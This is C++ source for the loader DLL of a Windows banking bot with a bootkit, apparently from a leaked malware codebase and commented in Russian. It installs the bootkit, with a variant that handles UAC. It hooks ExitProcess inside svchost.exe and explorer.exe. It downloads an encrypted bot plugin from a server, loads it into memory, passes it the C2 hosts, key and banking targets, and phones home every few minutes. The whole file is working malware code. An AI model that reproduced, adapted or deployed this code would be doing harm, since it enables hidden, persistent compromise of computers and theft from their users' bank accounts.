
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"
#include "DriverConnect.h"

#include "DbgRpt.h"
#include "Utils.h"

#include "BkInstall.h"




//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>

PCHAR MakeMachineID();

bool TryToCatchHostLevelInstanceMutex(const char* MutexPrefix)
{
	CHAR mutex_name[200];

	m_memset(mutex_name, 0, sizeof(mutex_name));

	PCHAR machine_id = MakeMachineID();
	m_lstrcat(mutex_name, "Global\\");
	m_lstrcat(mutex_name, MutexPrefix);
	m_lstrcat(mutex_name, machine_id);

	STR::Free(machine_id);

	LDRDBG("TryToCatchHostLevelInstanceMutex", "Mutex name '%s'.", mutex_name);

	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;

	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	HANDLE mutex_handle = (HANDLE)pCreateMutexA(&sa, FALSE, mutex_name);
	if (mutex_handle == NULL) return false;

	// Catch ownership of mutex and never release
	DWORD wait_result = (DWORD)pWaitForSingleObject(mutex_handle, 1000);
	if (wait_result == WAIT_OBJECT_0) return true;

	pCloseHandle(mutex_handle);
	return false;
}


void DbgRptSvchostThread(void* Arguments)
{
	LDRDBG("DbgRptSvchostThread", "Try to catch host level svchost mutex.");
	if (!TryToCatchHostLevelInstanceMutex("svrpt"))
	{
		LDRDBG("DbgRptSvchostThread", "Svchost mutex already catched by another process. Finishing.");
		return;
	}
	
	LDRDBG("DbgRptSvchostThread", "Svchost mutex catched successfully.Sleeping before network started (3 min)...");
	pSleep(3 * 60 * 1000);

	for(;;)
	{
		LDRDBG("DbgRptSvchostThread", "Notify debug report...");

		// 304_ld постоянная работа в Svchost (каждые 3 минуты)
		DebugReportStepByName("304_ld");

		DebugReportUpdateNtldrCheckSum();

		LDRDBG("DbgRptSvchostThread", "Sleeping 15 min after report...");
		pSleep(15 * 60 * 1000);
	}
}

void DbgRptExplorerThread(void* Arguments)
{
	LDRDBG("DbgRptExplorerThread", "Try to catch host level explorer mutex.");
	if (!TryToCatchHostLevelInstanceMutex("exrpt"))
	{
		LDRDBG("DbgRptExplorerThread", "Explorer mutex already catched by another process. Finishing.");
		return;
	}
	
	LDRDBG("DbgRptExplorerThread", "Explorer mutex catched successfully.");

	for(;;)
	{
		LDRDBG("DbgRptExplorerThread", "Notify debug report...");

		// 305_ld постоянная работа в Explorer (каждые 3 минуты)
		DebugReportStepByName("305_ld");

		LDRDBG("DbgRptExplorerThread", "Sleeping 15 min after report...");
		pSleep(15 * 60 * 1000);
	}
}

void DbgRptRebootNotifyThread(void* Arguments)
{
	while (true)
	{
		LDRDBG("DbgRptRebootNotifyThread", "Pinging server...");

		//150_d таймер отсчета завершения ребута
		DebugReportStepByName("150_d");

		LDRDBG("DbgRptRebootNotifyThread", "Sleeping 10 min");
		pSleep(10 * 60 * 1000);
	}
}



//----------------------------------------------------------------------------

PWCHAR SVChostName = L"svchost.exe";
char   BotPluginName[] = "bot.plug";

namespace DLLLoader
{
	typedef VOID (WINAPI *TExitProcess)(UINT Code);

	TExitProcess Real_ExitProcess = NULL;

	HANDLE ThreadHandle = NULL; // Хэндл запущенного потока

	DWORD ExplorerPID = 0;
	bool DLLLoadedInExplorer = false;


	const static char LoaderSignalFileName[] = {'\\', 'n', 't', 'l', 'd', 'l', '.', 'i', 'n', 'f',  0};

	//------------------------------------------------------------------------
	PCHAR GetSignalFileName()
	{
		// Функция возвращает имя сигнального файла


		// Определяем системный диск
		char WinDir[257];

		if (pGetWindowsDirectoryA(&WinDir[0], 256) == 0)
			return NULL;
		
		PCHAR Tmp = WinDir;
		while (*Tmp != ':') Tmp++;
		Tmp++;
		*Tmp = 0;
			
		// Создаём полнлё имя
		return STR::New(2, WinDir, (PCHAR)LoaderSignalFileName);
	}

	//------------------------------------------------------------------------

	VOID WINAPI Hook_ExitProcess(UINT Code)
	{
		// Попытка завершить процесс, если
		// запущен поток загрузки плагина, то дожидаемся его завершения
		if (ThreadHandle != NULL)
			pWaitForSingleObject(ThreadHandle, INFINITE);

		Real_ExitProcess(Code);
	}
	//------------------------------------------------------------------------

	void WaitExplorer()
	{
		// Функция ожидает запуска експлорера

		DWORD ID;
		DWORD I = 0;
		do
		{
			ID = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
			I++;
			if (ID == -1)
				pSleep(1000);
		}
		while (ID == -1 && I < 90);
	}
	//------------------------------------------------------------------------

//	PCHAR GetBotPlugCacheFileName()
//	{
//		// Функция возвращает имя файла кэша плагина
//		char Name[] = {'b', 'p', 'l', 'g', 'l', 's', 't', 'c', 'c', 'h', '.', 'c', 'a', 'c', 'h', 'e',  0};
//		return BOT::GetWorkPathInSysDrive(NULL, Name);
//	}

	//------------------------------------------------------------------------

	DWORD WINAPI DownloadMethod(LPVOID Data)
	{
		// Функция загрузки плагина
		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
		
		LDRDBG("BRDS", "Отключаем слежение за процессом svchost.exe ");

		DriverRemoveInjectToProcess(InitData, SVChostName);

		for (;;)
		{
				WSADATA wsa;
				ClearStruct(wsa);
				DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
				
				if (Code == 0) break;

				LDRDBG("BRDS", "pWSAStartup failed.");
				return 0; //pSleep(500);
		}
		
		
		LDRDBG("BRDS", "Запуск загрузки плагина бота (V 10) ");

		DWORD Size = 0;
		LPVOID Module = NULL;


		//Загружаем библиотеку
		LDRDBG("BRDS", "Инициализируем загрузку плагина!");

		// 311_ld начало загрузки файла плага с сервера в svchost
		DebugReportStepByName("311_ld");


		Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);

		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);

		// 312_ld окончание загрузки файла плага с сервера в svchost
		DebugReportStepByName("312_ld");

		if (Module != NULL)
		{
			// Сохраняем данные в кэш
			LDRDBG("BRDS", "Бот успешно загружен ");
			MemFree(Module);

			// передаем прочитанную длл в драйвер	
			// добавляем модуль для инжекта в процесс диспетчера задач

			// Уведомляем експлорер об успешной загрузке длл
			LDRDBG("BRDS", "Уведомляем эксплорер ");

			// 313_ld успешная загрузка файла плага с сервера в svchost
			DebugReportStepByName("313_ld");

			WaitExplorer();


			PCHAR Buf = "Ok: ";
			DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
		}

		ThreadHandle = NULL; // Идентификатор потока нас больше не интересует

		LDRDBG("BRDS", "DownloadMethod finised.");

		return 0;
	}

	

	//------------------------------------------------------------------------
	BOOL StartLoaderThread(LPVOID SystemArgument)
	{

		//// 303_ld запуск в Svchost (тут сети может не быть)
		//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("303_ld"));

		// Запускаем поток загружки длл
		
		//===================================================
		// Этап 1. Проверяем существование сигнального файда
		// Для этого создадим файл с экслюзивными праввами и
		// поставим его на удаление после перезапуска системы
		// Хэндл файла закрывать не будем, это даст чёткий
		// сигнал, что процесс запустивший загрузку ещё живой
		//===================================================
		PCHAR FileName = GetSignalFileName();
		if (FileName == NULL) return false;

		// Пытаемся открыть фай
		HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM , 0);
		if (H == INVALID_HANDLE_VALUE)
		{
			// Ошибка создания файла, считаем, что
			// в данный момент файлом владеет другой процесс
			STR::Free(FileName);
			return false;
		}

		// Указываем системе, что после перезапуска необходимо
		// удалить файл
		pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


		//===================================================
		// Этап 2: Устанавливаем хуки которые заблокируют
		// эавершение процесса до завершения работы нашего
		// потока
		//===================================================
		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
			__asm mov [Real_ExitProcess], eax


		//===================================================
		//  Этап 3: Запускаем поток
		//===================================================
		ThreadHandle = StartThread(DownloadMethod, SystemArgument);
		if (ThreadHandle == NULL)
		{
			pCloseHandle(H);
			return false;
		}
		pSetThreadPriority(ThreadHandle, THREAD_PRIORITY_NORMAL);

		//===================================================
		//  Этап 4: Запускаем поток в svchost отзвона на тестовый сервер
		//===================================================
		StartThread(DbgRptSvchostThread, NULL);



		return true;
	}

	//------------------------------------------------------------------------
}


//---------------------------------------------------------------------

typedef BOOL (WINAPI *TSetParam)(DWORD ID, PCHAR Value);

TSetParam SetParamMethod;

void SetParam(DWORD ID)
{
	// Функция получает параметр лоадера
	DWORD Size = GetBotParameter(ID, NULL, 0);
	if (Size == 0) return;

	PCHAR Buf = STR::Alloc(Size + 1);
	GetBotParameter(ID, Buf, Size);

	SetParamMethod(ID, Buf);

	STR::Free(Buf);
}
//---------------------------------------------------------------------


void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
{
	// 320_ld попытка загрузки и запуска BotPlug
	DebugReportStepByName("320_ld");


	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);

	if (Module == NULL)
	{
		LDRDBG("BRDS Explorer", "Не удалось загрузить длл в память ");
		return;
	}

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		SetBotParameter(BOT_PARAM_BOTPLUGNAME, BotPluginName);

		// Устанавливаем параметры бота
		LDRDBG("BRDS Explorer", "Устанавливаем параметры бота ");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
		SetParam(BOT_PARAM_BOTPLUGNAME);
		SetParam(BOT_PARAM_BANKINGHOSTS);
	}

	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
		LDRDBG("BRDS Explorer", "Бот успешно запущен ");
		DLLLoader::DLLLoadedInExplorer = true;
		Method(NULL, NULL, NULL);

		// 321_ld попытка загрузки и запуска BotPlug успешна
		DebugReportStepByName("321_ld");
	}
}

//------------------------------------------------------------------------

bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
{
	LDRDBG("BRDS Explorer", "DoStartBotDll() запущена");

	// 310_ld попытка получить файл плага с кеша в Explorer
	DebugReportStepByName("310_ld");

	if (IsNewProcess(DLLLoader::ExplorerPID))
		DLLLoader::DLLLoadedInExplorer = false;


	LDRDBG("BRDS Explorer", "DLLLoader::DLLLoadedInExplorer = %d", DLLLoader::DLLLoadedInExplorer);
	if (DLLLoader::DLLLoadedInExplorer)
		return true;


	LDRDBG("BRDS Explorer", "Читаем плагин из кэша");
	DWORD Size = 0;
	LPBYTE Module = Plugin::DownloadFromCache(BotPluginName, true, NULL, &Size);

	if (Module != NULL)
	{
		// Расшифровываем содержимое
		if (DelayBeforeStart != 0) pSleep(DelayBeforeStart);

		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована.Запускаем Bot.plug");
		ExplorerLoadDLL(InitData, Module, Size);

		LDRDBG("BRDS Explorer", "Bot.plug запущен.");

		MemFree(Module);
	}

	LDRDBG("BRDS Explorer", "DoStartBotDll() завершена.");

	return DLLLoader::DLLLoadedInExplorer;
}
//------------------------------------------------------------------------

VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
{
	DoStartBotDll(PUSER_INIT_NOTIFY(Data), 0);
}


//------------------------------------------------------------------------

DWORD WINAPI ExplorerStartProc(LPVOID Data)
{
	LDRDBG("BRDS", "Зупущена функция Эксплорера  ");

	if (Data == NULL) 
	{
		LDRDBG("BRDS Explorer", "Ошибочные данные для работы в эксплорере ");
		return 0;
	}

	// 302_ld запуск в Explorer (тут сети может не быть)
	DebugReportStepByName("302_ld");

	// Запускаем поток в svchost отзвона на тестовый сервер
	StartThread(DbgRptExplorerThread, NULL);

	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

	LDRDBG("BRDS Explorer", "Ожидаем пока драйвер отключит слежение за процессоь svchost.exe ");
	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);


	LDRDBG("BRDS Explorer", "Запуск потока Эксплорера ");

	// Первым делом пытаемся запустить длл из файла
	
	if (DoStartBotDll(InitData, 5000))
	{	
		LDRDBG("BRDS Explorer", "Бот успешно загружен из кэша ");
		return 0;
	} 

	// Регистрируем событие обратной связи
	LDRDBG("BRDS Explorer", "Регистрируем метод обратной связи в процессе Explorer ");
	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
	{
		LDRDBG("BRDS Explorer", "Ошибка регистрации метода обратной свзи експлорера ");
		return 0;
	}

	// Запускаем бесконечный цикл ожидания

	do
	{
		pSleepEx(10000, TRUE); 
		
	}while(1);

	return 0;
}
//------------------------------------------------------------------------

// If dll loader call any of exported function, it resets this variable to FALSE.
// So this action allows to avoid interference with our driver.
BOOL IsLoadedByOriginalBootkitLoader = TRUE;

bool IsDllLoadedByBootkitLoader()
{
	return (IsLoadedByOriginalBootkitLoader == TRUE);
}

void ResetBootkitLoaderFlag()
{
	IsLoadedByOriginalBootkitLoader = FALSE;
}

VOID WINAPI Start(
	PVOID  NormalContext /*системный указатель*/,
	PUSER_INIT_NOTIFY  SystemArgument1 /*аргумент который нужно сохранить чтоб использовать общение с драйвером*/,
	PVOID SystemArgument2/* ничего не передаеться*/
	)
{
	ResetBootkitLoaderFlag();
	
	// стартуем поток загрузки длл 
	if (SystemArgument1 == NULL)
		return;


	// определяем в каком процессе находимся
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);

	LDRDBG("BRDS", "LoaderDll loaded ...");

	//// 301_ld запуск вообще (тут сети может не быть)
	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("301_ld"));

	if (Hash == 0x2608DF01 /* svchost.exe */)
	{

		PCHAR CL = (PCHAR)pGetCommandLineA();

		LDRDBG("BRDS", "Драйвер перехватил запуск процесса svchost.exe ");
		LDRDBG("BRDS", "Командная строка svchost.exe - %s ", CL);

		//if (STR::Pos(CL, "localservice", 0, false) >= 0)
		{
			DLLLoader::StartLoaderThread(SystemArgument1);
		}
	}
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		// 
		LDRDBG("BRDS", "Драйвер перехватил запуск эксплорера ");
		StartThread(ExplorerStartProc, SystemArgument1);
	}
};

void ExplorerLoadAndRunBotPlug(void* Arguments)
{
	LDRDBG("ExplorerLoadAndRunBotPlug", "started.");
	DoStartBotDll(NULL, 0);
}

void StartBootkitDll(void* Arguments)
{
	// If Dll loaded by original Bootkit driver we MUST wait some timeout.
	// This happens because by default bootkit driver call DllMain(_, DLL_PROCESS_ATTACH, _)
	// at all.
	// Waiting helps system to load all libraries in default load order. After loading all modules 
	// we can apply GetApi for our reasons.

	DWORD timeout = 5 * 1000;
	
	LDRDBG("StartBootkitDll", "Sleeping %d ms.", timeout);
	pSleep(timeout);
	LDRDBG("StartBootkitDll", "Waking up after %d ms.", timeout);

	DebugReportInit();

	// определяем в каком процессе находимся
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);


	LDRDBG("StartBootkitDll", "LoaderDll loaded in path='%s' pid=%u...", Name, (DWORD)pGetProcessId() );

	LDRDBG("StartBootkitDll", "LoaderDll wake up and check IsLoadedByOriginalBootkit=%d", IsDllLoadedByBootkitLoader());
	if (!IsDllLoadedByBootkitLoader())
	{
		LDRDBG("StartBootkitDll", "LoaderDll is NOT loaded by Bootkit loader. Finished.");
		return;
	}

	LDRDBG("StartBootkitDll", "LoaderDll detects original bootkit loading.");
	
	if (Hash == 0x2608DF01 /* svchost.exe */)
	{
		LDRDBG("StartBootkitDll", "LoaderDll loaded in SVCHOST. ");
		StartThread(DbgRptSvchostThread, NULL);
	}
	
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		LDRDBG("StartBootkitDll", "LoaderDll loaded in EXPLORER. ");
		StartThread(DbgRptExplorerThread, NULL);
		
		LDRDBG("StartBootkitDll", "Starting loading and run plug.");
		StartThread(ExplorerLoadAndRunBotPlug, NULL);
	}
	
	LDRDBG("StartBootkitDll", "finished.");
}

PCHAR GetBootkitSignalFileName()
{
	PCHAR Path= STR::Alloc(MAX_PATH);
	PCHAR UID=STR::Alloc(120);

	pGetSystemDirectoryA(Path,MAX_PATH);
	GenerateUid(UID);
	Path[3]='\0';
	
	PCHAR Pref= STR::GetRightStr(UID,"0");
	m_lstrcat(Path, Pref);

	STR::Free(Pref);
	STR::Free(UID);
	
	return Path;
}

void WaitForOldRing3BotSelfRemoved()
{
	DWORD TimeoutInSec = 20 * 60;
	
	DWORD PeriodInSec = 60;
	DWORD PeriodCount = TimeoutInSec / PeriodInSec;
	PCHAR PathToSignalFile = GetBootkitSignalFileName();
	
	while (true)
	{
		bool IsExists = File::IsExists(PathToSignalFile);
		
		LDRDBG("WaitForOldRing3BotSelfRemoved", "check file='%s' exists='%d'",
			PathToSignalFile, IsExists);

		if(!IsExists) break;
		
		LDRDBG("WaitForOldRing3BotSelfRemoved", "Sleeping %d sec='%s'",
			PeriodInSec);

		// 318_ld ожидание удаления прежнего ring3 бота перед перезагрузкой
		DebugReportStepByName("318_ld");

		pSleep(PeriodInSec * 1000);
		PeriodCount--;

		if (PeriodCount == 0)
		{
			break;
		}
	}

	STR::Free(PathToSignalFile);
}

// Нужен для вызова в дропере.
// Чтобы не перетягивать всю работу по загрузке, расшифровке, встраиванию ключей и тд
// в дропер - сделан експорт в Loader_dll и она уже должна скачать плаг, имея в себе 
// всё, что для этого.
// Получилось значительно быстрее и изящнее.

BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
{
	// Инициализируемся в точке входа в длл: 
	// - сбрасываем флаг загрузчика буткита
	// - инициализируем вызов отладочных ф-ций
	ResetBootkitLoaderFlag();
	DebugReportInit();

	DWORD Size = 0;
	LPVOID Module = NULL;

	//Загружаем библиотеку
	LDRDBG("LoadPlugToCache", "Делаем отзвон о начале загрузки.");

	// 315_ld начало загрузки файла плага методом LoadPlugToCache
	DebugReportStepByName("315_ld");

	//Загружаем библиотеку
	LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");

	Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);

	LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);

	// 316_ld окончание загрузки файла плага методом LoadPlugToCache
	DebugReportStepByName("316_ld");

	if (Module != NULL)
	{
		// Сохраняем данные в кэш
		LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
		
		// 317_ld успешная загрузка файла плага методом LoadPlugToCache
		DebugReportStepByName("317_ld");
		MemFree(Module);

		if (WaitForBotRemove == TRUE) WaitForOldRing3BotSelfRemoved();

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI BkDropWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
{
	// Инициализируемся в точке входа в длл: 
	// - сбрасываем флаг загрузчика буткита
	// - инициализируем вызов отладочных ф-ций
	ResetBootkitLoaderFlag();
	DebugReportInit();

	// Устанавливаем буткит часть с учетов возможного UAC
	bool InstallResult = BkDeployAndInstallWithPossibleUac(SelfBody, SelfBodySize);
	LDRDBG("BkDropWithPossibleUac", "BkDeployAndInstallWithPossibleUac return %d", InstallResult);

	if (InstallResult == false) return FALSE;

	// Если получается установить - скачиваем ботплаг.
	// Закачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
	return LoadPlugToCache(FALSE, 0);
}

BOOL WINAPI BkDrop()
{
	// Инициализируемся в точке входа в длл: 
	// - сбрасываем флаг загрузчика буткита
	// - инициализируем вызов отладочных ф-ций
	ResetBootkitLoaderFlag();
	DebugReportInit();

	// Устанавливаем буткит часть
	// Если получается установить - скачиваем ботплаг.
	bool InstallResult = BkDeployAndInstallDll();
	LDRDBG("BkDrop", "DeployAndInstallBkDll return %d", InstallResult);

	if (InstallResult == false) return FALSE;

	LDRDBG("BkDrop", "Bk installed successfuly. Starting reboot ping thread...");
	StartThread(DbgRptRebootNotifyThread, NULL);

	// Закачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
	return LoadPlugToCache(FALSE, 0);
}

void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
{
	// Инициализируемся в точке входа в длл: 
	// - сбрасываем флаг загрузчика буткита
	// - инициализируем вызов отладочных ф-ций
	ResetBootkitLoaderFlag();
	DebugReportInit();

	LDRDBG("LoadPlugFromRawFile", "started with '%S' param", path);
	
	DWORD DllBodySize;

	LPBYTE DllBody = File::ReadToBufferW((PWCHAR)path, DllBodySize);
	LDRDBG("LoadPlugFromRawFile", "File::ReadToBufferW() return 0x%X", DllBody);

	if (DllBody == NULL) return;

	LDRDBG("LoadPlugFromRawFile", "Calling ExplorerLoadDLL() for loading plug...");
	ExplorerLoadDLL(NULL, DllBody, DllBodySize);
}

#pragma comment(linker, "/ENTRY:LoaderDllMain" )

DWORD WINAPI LoaderDllMain(HINSTANCE , DWORD reason, LPVOID )
{
	LDRDBG("LoaderDllMain", "called with reason=%d", reason);
	if (reason == DLL_PROCESS_ATTACH)
	{
		StartThread(StartBootkitDll, NULL);
	}

	// В дропере загрузчик Дллки в память проверяет 
	// возвращаемое значение. Поэтому ставим возвращать TRUE
	return TRUE;
}
